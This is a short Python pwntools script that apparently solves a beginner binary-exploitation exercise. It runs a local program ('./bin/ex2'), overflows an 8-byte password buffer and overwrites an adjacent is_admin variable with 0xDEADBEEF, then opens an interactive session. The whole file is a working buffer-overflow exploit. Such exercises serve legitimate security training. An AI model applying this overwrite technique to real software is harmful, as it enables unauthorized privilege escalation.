#!/usr/bin/env python3

from pwn import *


target = process("./bin/ex2")


padding = b"A" * 8  # pasw is 8 so we pad +

is_admin_value = p32(0xDEADBEEF)  #for isadmin



payload = padding + is_admin_value


target.sendline(payload)



#ret output

output = target.recvall()

print(output.decode())

#interact shell after
target.interactive()


